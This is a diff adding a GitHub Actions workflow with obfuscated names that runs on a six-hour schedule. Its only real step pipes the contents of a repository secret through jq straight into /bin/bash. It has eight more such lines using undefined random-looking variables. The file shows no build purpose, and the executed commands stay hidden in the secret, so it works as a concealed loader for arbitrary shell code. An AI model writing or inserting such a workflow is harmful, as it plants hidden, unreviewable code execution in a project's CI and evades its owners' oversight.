@@ -1,0 +1,26 @@
+name: absorbedaid
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: absorbedaid
+        env:
+          wfbct41: ${{ secrets.wfbct41 }}
+        run: |
+          echo $wfbct41 | jq -r .dvj30783 | /bin/bash
+          echo $lnhgb15 | jq -r .euujz51 | /bin/bash
+          echo $ab7 | jq -r .veaz82956 | /bin/bash
+          echo $tuie90188 | jq -r .vk4 | /bin/bash
+          echo $lo8147 | jq -r .vh45 | /bin/bash
+          echo $n2596 | jq -r .oywrl1 | /bin/bash
+          echo $mk31 | jq -r .isyo1506 | /bin/bash
+          echo $j25437 | jq -r .rq23129 | /bin/bash
+          echo $ovi644 | jq -r .qwmde05 | /bin/bash
+
